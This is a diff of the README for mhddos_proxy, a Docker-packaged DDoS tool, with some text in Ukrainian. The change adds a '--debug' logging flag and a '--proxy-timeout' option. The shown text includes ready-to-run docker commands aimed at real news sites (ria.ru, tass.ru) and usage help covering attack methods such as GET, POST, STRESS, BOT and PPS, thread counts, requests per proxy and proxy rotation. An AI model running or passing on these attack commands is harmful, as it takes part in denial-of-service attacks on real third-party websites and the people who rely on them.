@@ -100,6 +100,9 @@ UDP - **ТУТ ОБОВ'ЯЗКОВО VPN**
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru
 
+Щоб переглянути інформацію про хід атаки у текстовій формі, додайте прапорець `--debug`
+
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru
 
 Змінити частоту оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`
 
@@ -122,6 +125,7 @@ UDP - **ТУТ ОБОВ'ЯЗКОВО VPN**
                      [-p PERIOD]
                      [-c URL]
                      [--table]
+                     [--debug]
                      [--rpc RPC] 
                      [--http-methods METHOD [METHOD ...]]
 
@@ -134,8 +138,10 @@ UDP - **ТУТ ОБОВ'ЯЗКОВО VPN**
       -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
       -p, --period 900       How often to update the proxies (default is 900)
       --table                Print log as table
+      --debug                Print log as text
       --vpn                  Disable proxies to use VPN
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
+      --proxy-timeout 5      How many seconds to wait for the proxy to make a connection (default is 5)
       --http-methods GET     List of HTTP(s) attack methods to use.
                              (default is GET, POST, STRESS, BOT, PPS)
                              Refer to MHDDoS docs for available options
@@ -197,6 +203,7 @@ Note that **python** is used instead of python3.
                      [-p PERIOD]
                      [-c URL]
                      [--table]
+                     [--debug]
                      [--rpc RPC] 
                      [--http-methods METHOD [METHOD ...]]
 
@@ -209,8 +216,10 @@ Note that **python** is used instead of python3.
       -c, --config URL       URL to a config file (list of targets in plain text)
       -p, --period 900       How often to update the proxies (default is 900)
       --table                Print log as table
+      --debug                Print log as text
       --vpn                  Disable proxies to use VPN
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
+      --proxy-timeout 5      How many seconds to wait for the proxy to make a connection (default is 5)
       --http-methods GET     List of HTTP(s) attack methods to use.
                              (default is GET, POST, STRESS, BOT, PPS)
                              Refer to MHDDoS docs for available options
